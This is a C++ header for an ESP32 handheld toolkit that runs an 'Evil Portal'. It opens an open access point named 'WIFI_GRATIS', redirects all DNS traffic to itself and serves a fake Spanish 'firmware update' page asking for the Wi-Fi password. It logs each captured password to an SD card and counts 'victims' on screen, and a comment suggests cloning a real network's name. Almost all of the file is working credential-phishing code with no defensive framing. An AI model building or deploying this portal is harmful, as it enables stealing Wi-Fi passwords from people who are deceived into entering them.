#ifndef APPEVILPORTAL_H
#define APPEVILPORTAL_H
#include "App.h"
#include "Emojis.h"
#include "ui/Launcher.h"
#include "config.h"
#include <WiFi.h>
#include <DNSServer.h>
#include <WebServer.h>
#include <SD_MMC.h>

class AppEvilPortal : public App {
private:
    enum EstadoPortal { MENU, CORRIENDO, CREDENCIALES };
    EstadoPortal estado = MENU;

    int indiceMenu = 0;
    String opcionesMenu[2] = {"1. LANZAR PORTAL", "2. VER LOGS (SD)"};

    unsigned long ultimoMovimiento = 0;
    bool pantallaActualizada = false;
    bool btnAnterior = false;
    
    // Animación Neón
    int anguloNeon = 0;
    unsigned long ultimoFrameNeon = 0;

    // Red y Servidores
    const byte DNS_PORT = 53;
    DNSServer dnsServer;
    WebServer server;
    IPAddress apIP;

    // Variables de captura
    String ultimaCredencial = "";
    int totalCapturas = 0;

    // HTML del Portal Cautivo (Estilo Marauder / Router genérico)
    const char* htmlPortal = R"rawliteral(
    <!DOCTYPE html><html><head><meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Actualizacion de Firmware</title><style>
    body { font-family: Arial; text-align: center; margin-top: 50px; background-color: #f4f4f4; }
    .c { background: white; padding: 20px; border-radius: 10px; display: inline-block; box-shadow: 0px 0px 10px #ccc; }
    input { margin: 10px 0; padding: 10px; width: 80%; border: 1px solid #ccc; border-radius: 5px; }
    button { padding: 10px 20px; background: #007bff; color: white; border: none; border-radius: 5px; cursor: pointer; }
    </style></head><body><div class="c">
    <h2>Reautenticacion Requerida</h2>
    <p>Por motivos de seguridad, ingrese su contrasena de Wi-Fi para continuar.</p>
    <form action="/get" method="get">
    <input type="password" name="password" placeholder="Contrasena Wi-Fi" required><br>
    <button type="submit">Actualizar</button>
    </form></div></body></html>
    )rawliteral";

    void iniciarPortal() {
        apIP = IPAddress(192, 168, 4, 1);
        WiFi.mode(WIFI_AP);
        // Puedes cambiar el nombre por el de una red que quieras clonar
        WiFi.softAP("WIFI_GRATIS", ""); 
        delay(100);
        WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));

        // Redirigir todo el tráfico al ESP32
        dnsServer.start(DNS_PORT, "*", apIP);

        server.on("/", [this]() {
            server.send(200, "text/html", htmlPortal);
        });

        server.on("/get", [this]() {
            if (server.hasArg("password")) {
                ultimaCredencial = server.arg("password");
                totalCapturas++;
                guardarCredencial(ultimaCredencial);
                
                // Mostrar pantalla de "Procesando" a la víctima
                server.send(200, "text/html", "<html><body><h2>Actualizando... el dispositivo se reiniciara.</h2></body></html>");
                neopixelWrite(LED_PIN, 0, 255, 0); // Led Verde: ¡Atrapado!
            }
        });

        server.onNotFound([this]() {
            server.send(200, "text/html", htmlPortal);
        });

        server.begin();
    }

    void detenerPortal() {
        dnsServer.stop();
        server.stop();
        WiFi.mode(WIFI_STA);
        WiFi.disconnect();
    }

    void guardarCredencial(String pass) {
        if (SD_MMC.begin("/sdcard", true)) {
            File logFile = SD_MMC.open("/passwords.txt", FILE_APPEND);
            if (logFile) {
                logFile.println("CAPTURA: " + pass);
                logFile.close();
            }
        }
    }

    void leerCredenciales() {
        ultimaCredencial = "";
        if (SD_MMC.begin("/sdcard", true)) {
            File logFile = SD_MMC.open("/passwords.txt", FILE_READ);
            if (logFile) {
                while (logFile.available()) {
                    ultimaCredencial = logFile.readStringUntil('\n'); // Lee la última
                }
                logFile.close();
            } else {
                ultimaCredencial = "NO HAY LOGS";
            }
        } else {
            ultimaCredencial = "ERROR SD";
        }
    }

public:
    AppEvilPortal() : server(80) {}

    const char* obtenerNombre() override { return "EVIL PORTAL"; }
    const uint8_t* obtenerEmoji() override { return emoji_evilportal; } // Usa el emoji que prefieras
    
    void setup() override {}

    void alEntrar() override {
        estado = MENU;
        indiceMenu = 0;
        anguloNeon = 0;
        ultimoFrameNeon = millis();
        ultimoMovimiento = millis();
        pantallaActualizada = false;
        btnAnterior = (digitalRead(JOY_SW) == LOW);
        neopixelWrite(LED_PIN, 0, 0, 0); 
    }
    
    void alSalir() override {
        if (estado == CORRIENDO) detenerPortal();
        neopixelWrite(LED_PIN, 0, 0, 0);
    }

    void loop(Arduino_Canvas* canvas) override {
        int valVert = joyEjeY_esVertical ? analogRead(JOY_Y) : analogRead(JOY_X);
        bool arriba = joyInvVertical ? (valVert > 3200) : (valVert < 800);
        bool abajo = joyInvVertical ? (valVert < 800) : (valVert > 3200);
        bool botonAhora = (digitalRead(JOY_SW) == LOW);
        bool clicSimple = (botonAhora && !btnAnterior);

        // --- ANIMACIÓN NEÓN ---
        if (millis() - ultimoFrameNeon > 30) {
            anguloNeon = (anguloNeon + 8) % 360; 
            ultimoFrameNeon = millis();
            pantallaActualizada = false; 
        }

        // --- TAREAS DE SERVIDOR (No bloqueantes) ---
        if (estado == CORRIENDO) {
            dnsServer.processNextRequest();
            server.handleClient();
        }

        // --- LÓGICA DE MENÚ ---
        if (estado == MENU) {
            if (millis() - ultimoMovimiento > 200) {
                if (arriba) { indiceMenu--; pantallaActualizada = false; ultimoMovimiento = millis(); }
                if (abajo)  { indiceMenu++; pantallaActualizada = false; ultimoMovimiento = millis(); }
                if (indiceMenu < 0) indiceMenu = 1;
                if (indiceMenu > 1) indiceMenu = 0;
            }

            if (clicSimple) {
                if (indiceMenu == 0) { estado = CORRIENDO; iniciarPortal(); }
                if (indiceMenu == 1) { estado = CREDENCIALES; leerCredenciales(); }
                pantallaActualizada = false;
            }
        } 
        else if (estado == CORRIENDO || estado == CREDENCIALES) {
            if (clicSimple) {
                if (estado == CORRIENDO) detenerPortal();
                estado = MENU;
                neopixelWrite(LED_PIN, 0, 0, 0);
                pantallaActualizada = false;
            }
        }

        // --- RENDERIZADO VISUAL ---
        if (!pantallaActualizada) {
            canvas->fillScreen(BLACK);

            if (estado == MENU) {
                canvas->drawCircle(120, 120, 118, IRON_CYAN);
                canvas->drawArc(120, 120, 118, 112, anguloNeon, (anguloNeon + 60) % 360, IRON_BLUE); 
                
                Launcher::dibujarTextoCentrado(canvas, "MARAUDER EVIL PORTAL", 40, 1, IRON_CYAN);
                canvas->drawLine(20, 50, 220, 50, IRON_DARK);

                for (int i = 0; i < 2; i++) {
                    int yPos = 90 + (i * 35);
                    uint16_t color = (i == indiceMenu) ? WHITE : IRON_BLUE;
                    if (i == indiceMenu) {
                        canvas->fillRoundRect(15, yPos - 12, 210, 24, 3, IRON_DARK);
                        canvas->fillTriangle(20, yPos-4, 20, yPos+4, 25, yPos, IRON_RED);
                    }
                    Launcher::dibujarTextoCentrado(canvas, opcionesMenu[i].c_str(), yPos - 3, 1, color);
                }
            } 
            else if (estado == CORRIENDO) {
                // Neón en ROJO táctico (Modo Trampa)
                canvas->drawCircle(120, 120, 118, IRON_RED);
                canvas->drawArc(120, 120, 118, 112, anguloNeon, (anguloNeon + 60) % 360, WHITE); 
                
                Launcher::dibujarTextoCentrado(canvas, "PORTAL ACTIVO", 45, 1, IRON_RED);
                
                char buf[32]; sprintf(buf, "VICTIMAS: %d", totalCapturas);
                Launcher::dibujarTextoCentrado(canvas, buf, 90, 2, WHITE);
                
                Launcher::dibujarTextoCentrado(canvas, "Esperando conexiones...", 135, 1, IRON_CYAN);
                Launcher::dibujarTextoCentrado(canvas, "< Clic = Detener", 175, 1, IRON_DARK);
            }
            else if (estado == CREDENCIALES) {
                canvas->drawCircle(120, 120, 118, IRON_GREEN);
                Launcher::dibujarTextoCentrado(canvas, "ULTIMA CAPTURA", 45, 1, IRON_GREEN);
                canvas->drawLine(30, 55, 210, 55, IRON_DARK);
                
                // Mostrar la contraseña leída desde la SD
                Launcher::dibujarTextoCentrado(canvas, ultimaCredencial.c_str(), 100, 2, WHITE);
                
                Launcher::dibujarTextoCentrado(canvas, "< Clic = Volver", 175, 1, IRON_DARK);
            }

            // Instrucción genérica (se sobreescribe con el fondo negro, pero asegura limpieza)
            if(estado == MENU) {
                canvas->drawBitmap(120 - 45, 195, emoji_back, 32, 32, IRON_CYAN);
                canvas->setCursor(120 - 25, 195); canvas->setTextColor(IRON_RED); 
                canvas->print("DOBLE CLICK");
            }

            canvas->flush();
            pantallaActualizada = true;
        }

        btnAnterior = botonAhora;
        delay(10);
    }
};
#endif